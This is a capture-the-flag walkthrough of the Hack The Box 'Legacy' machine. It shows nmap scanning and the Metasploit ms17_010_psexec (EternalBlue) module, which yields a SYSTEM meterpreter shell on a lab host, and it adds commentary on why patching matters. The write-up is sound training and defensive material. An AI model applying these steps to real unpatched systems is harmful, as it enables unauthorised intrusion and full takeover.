# Legacy Walkthrough

I have been going back and re-doing retired boxes on Hack The Box, with a focus on writing up the process of compromising each box. For flavour, I'm also providing a bit of commentary around thinking through the attack from the attacker's perspective, as well as thinking about it from a system administrator/business owner perspective.

##The Mission

Hack The Box is a platform to learn and practice penetration testing techniques. Hack The Box makes virtual machines ("boxes") available for users to scan and exploit. It is ultimately a "capture the flag"-type of game, with the goal being to find and retrieve two "flags" or strings, one which can be accessed by a regular user on the box (the "user flag") and one that can only be accessed by the root user (the "root flag").

## The Target
![Legacy Info Card](/Legacy/images/1-Legacy-Info-Card.PNG)

Today, we're going to take on the Legacy box. It is an easy Windows box and would provide a great introduction to penetration testing for anyone interested in learning.

## The Setup

I am a believer in the the saying (often attributed to Abraham Lincoln) "if I had eight hours to chop down a tree, I’d spend six sharpening my axe". However, in this case, we're going to substitute "chop down a tree" for "hack a box" and "six hours sharpening my axe" for "countless hours tweaking and customizing my systems". I'm sure Honest Abe would be proud.

Throughout my time on the Hack The Box platform, I have found that sometimes boxes require tools you don't have, or versions of tools you can't find easily. For this reason, I prefer to keep a number of virtual machines around, including Kali, Parrot, and BlackArch. Although this works great, it would be nice if I wasn't maintaining ~25 virtual machines (although Vagrant is a huge help for this).

If you spend any time on forums discussing penetration testing, you'll see that I'm not the only one torn between different operating systems. Questions like "What is the best distribution for hacking?" or "Should I use Kali or Parrot" are posted on almost a daily basis. To this, I say: why choose?

![Bedrock Strata](/Legacy/images/2-Bedrock-Strata.PNG)

To spice up our attack on Legacy, I'm going to try a different system that isn't frequently discussed in the penetration testing community. I'm running a customized version of Bedrock Linux in a virtual machine on a Windows 10 host, with Kali Linux and BlackArch in their own strata.

Why is this awesome?

This means that we can use tools like `nmap` from Blackarch, Kali, or Ubuntu (or any other distribution)! Admittedly, using this setup on the Legacy box will be like swatting a fly with a truck, but if you enjoy having a really sharp axe, you should definitely check out [Bedrock Linux](https://bedrocklinux.org/).

Let's put it to work.

## The Hack
### Enumerating Legacy

We want to get some information about Legacy. We know that it is running Windows and we know that it has an IP address of 10.10.10.4. Beyond this, it would be helpful to know what ports are open on the box and what services are running. I normally do this in two stages. First, we can run a quick scan with nmap to get a sense of what we will be dealing with. To do this, we will run `sudo nmap -sC -sV 10.10.10.4`.

Second (in the background), we will also run a more fulsome scan with nmap with `sudo nmap -p- -sV -sC -O -A -T4 -v --script vuln 10.10.10.4`. This scan will go through and use the Nmap Scripting Engine to check for vulnerabilities on the box. However, this takes some time, so we'll let it run in the background for now.

Our quick scan will give us the following output:

![Quick Nmap Scan](/Legacy/images/3-Quick-Nmap.PNG)

The quick scan will let us get started while we wait for the longer scan to finish. We can see that we have a couple of ports open, including 139 and 445. Interestingly, it looks like Legacy is likely running SMB on Windows XP. This should immediately be a red flag since Windows XP is an out of date operating system and is no longer supported.

Our longer scan will eventually come back and report a number of findings:

![Long Nmap Scan](/Legacy/images/4-Nmap-Long-Scan.PNG)

### Thinking About the Scan

Our fulsome nmap scan revealed some interesting results. Notably, nmap appears to be reporting that the box is vulnerable to two remote code execution vulnerabilities, CVE-2017-0143 and CVE-2008-4250. CVE-2017-0143 is a relatively well-known vulnerability in Microsoft SMBv1, which is subject to the (in)famous [EternalBlue exploit](https://www.wikiwand.com/en/EternalBlue).

I highly recommend reading up on the history of EternalBlue (and the other "Eternal" exploits) and how it has been used since being developed. In short, the NSA identified a vulnerability in Microsoft SMB servers and developed the EternalBlue exploit. The NSA kept it hidden for a number of years until the NSA became aware of the fact that the exploit had been leaked. The NSA warned Microsoft in 2017 about the existence of the SMB vulnerability, and Microsoft released patches for it. As is commonly the case, many people and organizations did not implement the patches, leaving them vulnerable to this exploit.

The EternalBlue exploit was then distributed by the hacker group known as The Shadow Brokers. This exploit was then incorporated into and used by the [WannaCry ransomware](https://www.wikiwand.com/en/WannaCry_ransomware_attack), which locked down computers all across the world.

Putting on a legal/business hat, this is where the rubber hits the road on your IT service agreements and your internal policies. Patches need to be regularly implemented. Sometimes, this means weighing the security risks of leaving a vulnerability unpatched against the risk of implementing a patch that has not been carefully tested in a test environment. Well-defined change control procedures and security policies can assist with this process. Internal policies regarding asset management and tracking can help speed up patching. Regular vulnerability scanning can also help ward against these threats.

Even though the world had a hard lesson in patching with the rise of EternalBlue and WannaCry, failures to patch are still a common issue, as evidenced by the January 14, 2020 end of life for Windows 7. Many organizations waited until the last moment to migrate off of Windows 7, with some failing to migrate off of Windows 7 altogether.

Let's demonstrate why failing to patch is a problem.

### Getting the Root Flag

Those who have been carefully reading this post might be slightly surprised at this section title. Normally, you get a foothold in the target system, enumerate the system further to find a path to escalate your privileges, and then--after compromising the administrator account--you can get the root flag. That won't be necessary here since we're going to fully compromise the system in one step.

Both CVE-2017-0143 and CVE-2008-4250 would be viable paths forward to compromising the box. Since we have been discussing EternalBlue, let's demonstrate how it works. By simply googling "MS17-010 exploit", we can see from the first result that there is a metasploit module for this vulnerability.

Start Metasploit with `msfconsole`:

![Metasploit](/Legacy/images/5-Metasploit.PNG)

We can search through the modules using the command `search ms17-010`, `search eternalblue`, or `search CVE-2017-0143`. Each of these searches return the same results.

![Metasploit Search](/Legacy/images/6-Metasploit-Search.PNG)

We have a few different exploits come up. Module #4 on our list is the exploit that came up in our google search. Let's load it up with the command `use exploit/windows/smb/ms17_010_psexec`.

We can then check the available options with the command `options`. We would then set the necessary settings (which in this case is `RHOSTS` and `LHOST`). `RHOSTS` are the target(s), which in this case is 10.10.10.4. `LHOST` is your local host, or your attacking machine. In this case, we will set it to our own IP address on the Hack The Box network (alternatively, you can set this value to `tun0`). So we would run:
```
set RHOSTS 10.10.10.4
set LHOST [Your Hack The Box IP Address or "tun0"]
```
Re-running the `options` command, you can check to make sure you put everything in correctly:

![Metasploit Options](/Legacy/images/7-Metasploit-Options.PNG)

We can run the check command now to see if the exploit is likely to work:

![Metasploit Check](/Legacy/images/8-Metasploit-Check.PNG)

Since it appears that this exploit should be effective, we can initiate the exploit by typing `run`:

![Metasploit Exploit](/Legacy/images/9-Metasploit-Exploit.PNG)

And it worked! We have a meterpreter shell that is communicating back to the box. Meterpreter has its own set of commands, including getuid, which allows us to see which user we are running as. Running this command, we can see that we are `NT AUTHORITY\SYSTEM`, which is the LocalSystem account and is the most powerful account on a local Windows instance.

![Getuid](/Legacy/images/10-Getuid.PNG)

We can drop into a shell on the box using the command shell. After looking around for a short time, we can locate both the root and the user flags. Since we have administrator privileges on the box, we can read both without any issue.

![Flags](/Legacy/images/11-Flags.PNG)

And we're done!

## Wrapping Up

The ease at which we could exploit Legacy shows why malware such as WannaCry was so pervasive. This is why patching is so important!
